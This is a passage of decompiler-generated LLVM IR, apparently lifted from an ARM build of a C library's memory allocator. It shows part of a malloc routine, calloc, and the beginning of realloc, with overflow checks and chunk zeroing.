  %v2_129e8 = inttoptr i32 %v1_129e8 to i32*
  %v3_129e8 = load i32, i32* %v2_129e8, align 4
  store i32 %v3_129e8, i32* %ip.global-to-local, align 4
  %v1_129ec = add i32 %v3_129e8, 4
  %v2_129ec = inttoptr i32 %v1_129ec to i32*
  %v3_129ec = load i32, i32* %v2_129ec, align 4
  store i32 %v1_12600, i32* %r1.global-to-local, align 4
  %v1_129f4 = and i32 %v3_129ec, -4
  store i32 %v1_129f4, i32* %r3.global-to-local, align 4
  %v3_129f8 = icmp ult i32 %v1_129f4, %v1_12600
  br i1 %v3_129f8, label %dec_label_pc_12a24, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %bb171
  %v0_12a00 = load i32, i32* @sl, align 4
  %v2_12a00 = sub i32 %v1_129f4, %v0_12a00
  %v2_12a04 = add i32 %v0_12a00, %v3_129e8
  store i32 %v2_12a04, i32* %r1.global-to-local, align 4
  %v1_12a08 = or i32 %v2_12a00, 1
  store i32 %v1_12a08, i32* %r3.global-to-local, align 4
  %v1_12a0c = or i32 %v0_12a00, 1
  store i32 %v1_12a0c, i32* %r2.global-to-local, align 4
  %v1_12a10 = add i32 %v3_129e8, 8
  store i32 %v1_12a10, i32* %r0.global-to-local, align 4
  store i32 %v1_12a0c, i32* %v2_129ec, align 4
  %v0_12a18 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a18 = load i32, i32* %lr.global-to-local, align 4
  %v2_12a18 = add i32 %v1_12a18, 44
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  store i32 %v0_12a18, i32* %v3_12a18, align 4
  %v0_12a1c = load i32, i32* %r3.global-to-local, align 4
  %v1_12a1c = load i32, i32* %r1.global-to-local, align 4
  %v2_12a1c = add i32 %v1_12a1c, 4
  %v3_12a1c = inttoptr i32 %v2_12a1c to i32*
  store i32 %v0_12a1c, i32* %v3_12a1c, align 4
  br label %dec_label_pc_12a3c

dec_label_pc_12a24:                               ; preds = %bb160, %bb171, %dec_label_pc_12800
  store i32 63028, i32* %r3.global-to-local, align 4
  %v0_12a28 = call i32 @__aeabi_read_tp()
  %v3_12a2c = load i16, i16* @global_var_22068.345, align 2
  %v4_12a2c = sext i16 %v3_12a2c to i32
  store i32 %v4_12a2c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12a34 = add i32 %v4_12a2c, %v0_12a28
  %v4_12a34 = inttoptr i32 %v3_12a34 to i32*
  store i32 12, i32* %v4_12a34, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a3c

dec_label_pc_12a3c:                               ; preds = %bb154, %bb153, %dec_label_pc_12a00, %dec_label_pc_12648, %dec_label_pc_12a24
  %v0_12a3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12a3c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %.thread4, %dec_label_pc_12614, %.thread124, %dec_label_pc_12484, %dec_label_pc_12478, %dec_label_pc_122e0, %dec_label_pc_12264, %dec_label_pc_12a3c
  store i32 %v2_12184, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v4_12a50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 44) to i32*), align 4
  store i32 %v4_12a50, i32* @ip, align 4
  store i32 76380, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12a50)
  br label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_121bc, %dec_label_pc_12a40
  %v0_12a5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12a5c, i32* %r0.global-to-local, align 4
  store i32 %v3_12158, i32* @r4, align 4
  store i32 %v6_12158, i32* @r5, align 4
  store i32 %v9_12158, i32* @r6, align 4
  store i32 %v12_12158, i32* @r7, align 4
  store i32 %v15_12158, i32* @r8, align 4
  store i32 %v18_12158, i32* @sb, align 4
  store i32 %v21_12158, i32* @sl, align 4
  store i32 %v24_12158, i32* @fp, align 4
  store i32 %v27_12158, i32* @lr, align 4
  ret i32 %v0_12a5c

; uselistorder directives
  uselistorder i32 %v0_12a00, { 1, 0, 2 }
  uselistorder i32 %v3_129e8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_129e4, { 1, 0 }
  uselistorder i32 %v2_129c8, { 2, 0, 1, 3 }
  uselistorder i32 %v4_129c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12978, { 1, 2, 0 }
  uselistorder i32 %v0_12940, { 1, 0 }
  uselistorder i32 %v0_12934, { 1, 0 }
  uselistorder i32 %v2_12924, { 1, 0 }
  uselistorder i32 %v2_128b4, { 2, 1, 0 }
  uselistorder i32 %v2_1289c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12894, { 1, 0, 2 }
  uselistorder i32 %v1_12890, { 2, 1, 0 }
  uselistorder i32 %v0_12890, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12874, { 1, 0 }
  uselistorder i32 %v2_1284c, { 1, 0 }
  uselistorder i32 %v3_12840, { 1, 0, 2 }
  uselistorder i32 %v2_12820, { 1, 0, 2 }
  uselistorder i32* %v2_12818, { 1, 0, 2 }
  uselistorder i32 %v0_12800, { 1, 0 }
  uselistorder i32 %v6_127dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_127c8, { 2, 1, 0 }
  uselistorder i32 %v0_127b0, { 1, 0 }
  uselistorder i32 %v2_1276c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12768, { 1, 0 }
  uselistorder i32 %v3_12740, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12720, { 1, 0, 2 }
  uselistorder i32 %v2_12708, { 1, 2, 0, 3 }
  uselistorder i32 %v1_126b0, { 2, 1, 0 }
  uselistorder i32 %v6_126a4, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12680, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12640, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12600, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_125f8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_125f4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_125e0, { 1, 0 }
  uselistorder i32 %v7_125a0, { 1, 0 }
  uselistorder i32 %v4_125a0, { 1, 0 }
  uselistorder i32 %v0_12570, { 1, 0 }
  uselistorder i32 %v2_12544, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1254057, { 1, 0 }
  uselistorder i32 %v1_1250c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_124f4., { 1, 2, 0 }
  uselistorder i32 %v0_124fc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_124fc, { 1, 0 }
  uselistorder i32 %v3_124dc, { 1, 0 }
  uselistorder i32 %v4_124d8, { 1, 0, 2 }
  uselistorder i32 %v1_12448, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_124a0, { 1, 0 }
  uselistorder i32 %v1_12484, { 1, 0 }
  uselistorder i32 %v1_12324, { 1, 0 }
  uselistorder i32 %v0_12464, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1242c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_124c0.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12408, { 2, 1, 0 }
  uselistorder i32 %v3_123fc, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_1231c, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_123c4, { 1, 0 }
  uselistorder i32 %v3_123b8, { 1, 0 }
  uselistorder i32 %v0_123c4, { 1, 0 }
  uselistorder i32 %v3_1239c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1238c, { 1, 0, 2 }
  uselistorder i32 %v3_12344, { 2, 1, 0 }
  uselistorder i32 %v0_12334, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12304, { 1, 0 }
  uselistorder i32 %v1_122b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_122b4, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_12258, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_1224c, { 1, 0 }
  uselistorder i32 %v3_1221c, { 1, 0 }
  uselistorder i32 %v0_12210, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_121f0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_121e4, { 1, 0 }
  uselistorder i32 %v0_121b4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 0, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 2, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12a5c, { 1, 0 }
  uselistorder label %dec_label_pc_12a40, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12a3c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12a24, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_129b8, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12934, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1292c, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12800, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_12734, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_125ec, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_12540, { 1, 0 }
  uselistorder label %dec_label_pc_12548.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1250c, { 1, 0 }
  uselistorder label %dec_label_pc_124c0, { 1, 0 }
  uselistorder label %dec_label_pc_12454, { 1, 0 }
  uselistorder label %dec_label_pc_12450, { 1, 0 }
  uselistorder label %dec_label_pc_123fc, { 1, 0 }
  uselistorder label %dec_label_pc_123e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1239c, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12a70(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a70:
  %v0_12a70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a70, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12a70
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12a70, %bb
  %v4_12a8c = phi i32 [ %arg1, %dec_label_pc_12a70 ], [ 0, %bb ]
  ret i32 %v4_12a8c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12a90 = load i32, i32* @r4, align 4
  %v6_12a90 = load i32, i32* @r5, align 4
  %v9_12a90 = load i32, i32* @r6, align 4
  %v12_12a90 = load i32, i32* @lr, align 4
  %v2_12a98 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12aa8 = mul i32 %arg2, %arg1
  store i32 %v2_12aa8, i32* @r6, align 4
  br i1 %v2_12a98, label %dec_label_pc_12ae0, label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12ab8 = udiv i32 %v2_12aa8, %arg1
  %v9_12abc = icmp eq i32 %v2_12ab8, %arg2
  br i1 %v9_12abc, label %dec_label_pc_12ae0, label %dec_label_pc_12ac4

dec_label_pc_12ac4:                               ; preds = %dec_label_pc_12ab0
  %v0_12ac8 = call i32 @__aeabi_read_tp()
  %v3_12acc = load i16, i16* @global_var_22068.345, align 2
  %v4_12acc = sext i16 %v3_12acc to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12ad8 = add i32 %v4_12acc, %v0_12ac8
  %v4_12ad8 = inttoptr i32 %v3_12ad8 to i32*
  store i32 12, i32* %v4_12ad8, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12ae0:                               ; preds = %dec_label_pc_12ab0, %entry
  %v4_12ae4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 108) to i32*), align 4
  store i32 %v4_12ae4, i32* @r4, align 4
  %v4_12afc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  store i32 %v4_12afc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12afc)
  %v0_12b10 = load i32, i32* @r5, align 4
  %v2_12b10 = add i32 %v0_12b10, 16
  %v3_12b10 = inttoptr i32 %v2_12b10 to i32*
  %v4_12b10 = load i32, i32* %v3_12b10, align 4
  store i32 %v4_12b10, i32* %ip.global-to-local, align 4
  store i32 76572, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b10)
  %v0_12b1c = load i32, i32* @r6, align 4
  store i32 %v0_12b1c, i32* @r0, align 4
  %v0_12b20 = call i32 @malloc()
  store i32 %v0_12b20, i32* %r4.global-to-local, align 4
  %v2_12b24 = icmp eq i32 %v0_12b20, 0
  br i1 %v2_12b24, label %.thread, label %dec_label_pc_12b2c

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12ae0
  %v1_12b2c = add i32 %v0_12b20, -4
  %v2_12b2c = inttoptr i32 %v1_12b2c to i32*
  %v3_12b2c = load i32, i32* %v2_12b2c, align 4
  %v1_12b30 = and i32 %v3_12b2c, 2
  %v2_12b30 = icmp eq i32 %v1_12b30, 0
  br i1 %v2_12b30, label %dec_label_pc_12b38, label %.thread

dec_label_pc_12b38:                               ; preds = %dec_label_pc_12b2c
  %v1_12b386 = add i32 %v3_12b2c, -4
  %v1_12b3c = and i32 %v1_12b386, -4
  %v3_12b40 = udiv i32 %v1_12b3c, 4
  store i32 %v3_12b40, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12b3c, 36
  %v2_12b48 = icmp ult i32 %v1_12b3c, 33
  %v3_12b48 = or i1 %tmp, %v2_12b48
  br i1 %v3_12b48, label %dec_label_pc_12b54, label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12b38
  %v3_12b4c = inttoptr i32 %v0_12b20 to i8*
  %v4_12b4c = call i32 @__GI_memset(i8* %v3_12b4c, i32 0, i32 %v1_12b3c)
  br label %.thread

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b38
  %tmp7 = icmp eq i32 %v1_12b3c, 16
  %v2_12b58 = inttoptr i32 %v0_12b20 to i32*
  store i32 0, i32* %v2_12b58, align 4
  %v1_12b5c = load i32, i32* %r4.global-to-local, align 4
  %v2_12b5c = add i32 %v1_12b5c, 4
  %v3_12b5c = inttoptr i32 %v2_12b5c to i32*
  store i32 0, i32* %v3_12b5c, align 4
  %v1_12b60 = load i32, i32* %r4.global-to-local, align 4
  %v2_12b60 = add i32 %v1_12b60, 8
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 0, i32* %v3_12b60, align 4
  %v2_12b64 = icmp ult i32 %v1_12b3c, 13
  %v3_12b64 = or i1 %tmp7, %v2_12b64
  br i1 %v3_12b64, label %.thread, label %dec_label_pc_12b68

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b54
  %v0_12b68 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b6c = load i32, i32* %r4.global-to-local, align 4
  %v2_12b6c = add i32 %v1_12b6c, 12
  %v3_12b6c = inttoptr i32 %v2_12b6c to i32*
  store i32 0, i32* %v3_12b6c, align 4
  %v1_12b70 = load i32, i32* %r4.global-to-local, align 4
  %v2_12b70 = add i32 %v1_12b70, 16
  %v3_12b70 = inttoptr i32 %v2_12b70 to i32*
  store i32 0, i32* %v3_12b70, align 4
  %tmp8 = icmp ult i32 %v0_12b68, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12b78

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b68
  %v0_12b78 = load i32, i32* %ip.global-to-local, align 4
  %v7_12b78 = icmp eq i32 %v0_12b78, 9
  %v1_12b7c = load i32, i32* %r4.global-to-local, align 4
  %v2_12b7c = add i32 %v1_12b7c, 20
  %v3_12b7c = inttoptr i32 %v2_12b7c to i32*
  store i32 0, i32* %v3_12b7c, align 4
  %v1_12b80 = load i32, i32* %r4.global-to-local, align 4
  %v2_12b80 = add i32 %v1_12b80, 24
  %v3_12b80 = inttoptr i32 %v2_12b80 to i32*
  store i32 0, i32* %v3_12b80, align 4
  br i1 %v7_12b78, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12b78
  %v2_12b84 = load i32, i32* %r4.global-to-local, align 4
  %v3_12b84 = add i32 %v2_12b84, 32
  %v4_12b84 = inttoptr i32 %v3_12b84 to i32*
  store i32 0, i32* %v4_12b84, align 4
  %v2_12b88 = load i32, i32* %r4.global-to-local, align 4
  %v3_12b88 = add i32 %v2_12b88, 28
  %v4_12b88 = inttoptr i32 %v3_12b88 to i32*
  store i32 0, i32* %v4_12b88, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12b78, %dec_label_pc_12b2c, %dec_label_pc_12b68, %dec_label_pc_12b54, %dec_label_pc_12ae0, %dec_label_pc_12b4c, %bb
  store i32 1, i32* @r1, align 4
  %v0_12b98 = load i32, i32* @r5, align 4
  %v2_12b98 = add i32 %v0_12b98, 44
  %v3_12b98 = inttoptr i32 %v2_12b98 to i32*
  %v4_12b98 = load i32, i32* %v3_12b98, align 4
  store i32 %v4_12b98, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12b98)
  br label %dec_label_pc_12ba4

dec_label_pc_12ba4:                               ; preds = %dec_label_pc_12ac4, %.thread
  %v0_12ba4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12a90, i32* @r4, align 4
  store i32 %v6_12a90, i32* @r5, align 4
  store i32 %v9_12a90, i32* @r6, align 4
  store i32 %v12_12a90, i32* @lr, align 4
  ret i32 %v0_12ba4

; uselistorder directives
  uselistorder i32 %v1_12b3c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12b20, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12ba4, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_12bbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12bbc:
  %v0_12bbc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12bbc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12bbc
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12bbc, %bb
  %v4_12bcc = phi i32 [ %arg1, %dec_label_pc_12bbc ], [ 0, %bb ]
  ret i32 %v4_12bcc

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12bd0 = load i32, i32* @r4, align 4
  %v6_12bd0 = load i32, i32* @r5, align 4
  %v9_12bd0 = load i32, i32* @r6, align 4
  %v12_12bd0 = load i32, i32* @r7, align 4
  %v15_12bd0 = load i32, i32* @r8, align 4
  %v18_12bd0 = load i32, i32* @sb, align 4
  %v21_12bd0 = load i32, i32* @sl, align 4
  %v24_12bd0 = load i32, i32* @fp, align 4
  %v27_12bd0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12bdc = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12bdc, label %dec_label_pc_12bf0, label %dec_label_pc_12c00

dec_label_pc_12bf0:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12bf4 = call i32 @malloc()
  store i32 %v0_12bf4, i32* %r0.global-to-local, align 4
  store i32 %v0_12bf4, i32* @r4, align 4
  br label %dec_label_pc_12f60

dec_label_pc_12c00:                               ; preds = %entry
  %v2_12c00 = icmp eq i32 %arg2, 0
  br i1 %v2_12c00, label %dec_label_pc_12c08, label %dec_label_pc_12c14

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12c00
  %v0_12c08 = call i32 @free()
  store i32 %v0_12c08, i32* %r0.global-to-local, align 4
  %v0_12c0c = load i32, i32* @r6, align 4
  store i32 %v0_12c0c, i32* @r4, align 4
  br label %dec_label_pc_12f60

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12c00
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12c1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 108) to i32*), align 4
  store i32 %v4_12c1c, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12c1c, i32* %r2.global-to-local, align 4
  %v4_12c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 68) to i32*), align 4
  store i32 %v4_12c28, i32* %r1.global-to-local, align 4
  %v2_12c2c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12c2c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12c34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12c34)
  %v0_12c40 = load i32, i32* @r4, align 4
  store i32 %v0_12c40, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  %v4_12c4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_12c58.449 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12c4c)
  %v0_12c58 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12c58, -32
  br i1 %tmp36, label %dec_label_pc_12c7c, label %dec_label_pc_12c60

dec_label_pc_12c60:                               ; preds = %dec_label_pc_12c14
  store i32 62456, i32* %r2.global-to-local, align 4
  %v0_12c64 = call i32 @__aeabi_read_tp()
  store i32 %v0_12c64, i32* %r0.global-to-local, align 4
  %v3_12c68 = load i16, i16* @global_var_22068.345, align 2
  %v4_12c68 = sext i16 %v3_12c68 to i32
  store i32 %v4_12c68, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_12c74 = add i32 %v4_12c68, %v0_12c64
  %v4_12c74 = inttoptr i32 %v3_12c74 to i32*
  store i32 12, i32* %v4_12c74, align 4
  br label %dec_label_pc_12f60

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c14
  %v1_12c7c = add i32 %v0_12c58, 11
  store i32 %v1_12c7c, i32* %r0.global-to-local, align 4
  %v0_12c80 = load i32, i32* @r5, align 4
  %v1_12c80 = add i32 %v0_12c80, -4
  %v2_12c80 = inttoptr i32 %v1_12c80 to i32*
  %v3_12c80 = load i32, i32* %v2_12c80, align 4
  store i32 %v3_12c80, i32* %r2.global-to-local, align 4
  %v2_12c84 = icmp ugt i32 %v1_12c7c, 14
  %v7_12c84 = icmp eq i32 %v1_12c7c, 15
  %v2_12c88 = xor i1 %v2_12c84, true
  %v3_12c88 = or i1 %v7_12c84, %v2_12c88
  br i1 %v3_12c88, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_12c7c
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_12c7c, %bb
  %v2_12c8c = xor i1 %v7_12c84, true
  %v3_12c8c = and i1 %v2_12c84, %v2_12c8c
  br i1 %v3_12c8c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_12c8c = and i32 %v1_12c7c, -8
  store i32 %v5_12c8c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12c90 = and i32 %v3_12c80, 2
  %v2_12c90 = icmp eq i32 %v1_12c90, 0
  %v1_12c94 = add i32 %v0_12c80, -8
  store i32 %v1_12c94, i32* @sl, align 4
  %v1_12c98 = and i32 %v3_12c80, -4
  store i32 %v1_12c98, i32* @r6, align 4
  br i1 %v2_12c90, label %dec_label_pc_12ca0, label %dec_label_pc_12e78

dec_label_pc_12ca0:                               ; preds = %bb29
  %v1_12ca0 = load i32, i32* @sb, align 4
  %v3_12ca0 = icmp ult i32 %v1_12c98, %v1_12ca0
  br i1 %v3_12ca0, label %dec_label_pc_12cac, label %bb30

bb30:                                             ; preds = %dec_label_pc_12ca0
  store i32 %v1_12c98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e10

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12ca0
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12cb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_12cb4, i32* %r0.global-to-local, align 4
  %v1_12cb8 = add i32 %v4_12cb4, 44
  %v2_12cb8 = inttoptr i32 %v1_12cb8 to i32*
  %v3_12cb8 = load i32, i32* %v2_12cb8, align 4
  store i32 %v3_12cb8, i32* %r3.global-to-local, align 4
  %v2_12cbc = add i32 %v1_12c98, %v1_12c94
  store i32 %v2_12cbc, i32* @r4, align 4
  %v9_12cc0 = icmp eq i32 %v2_12cbc, %v3_12cb8
  %v1_12cc4 = add i32 %v2_12cbc, 4
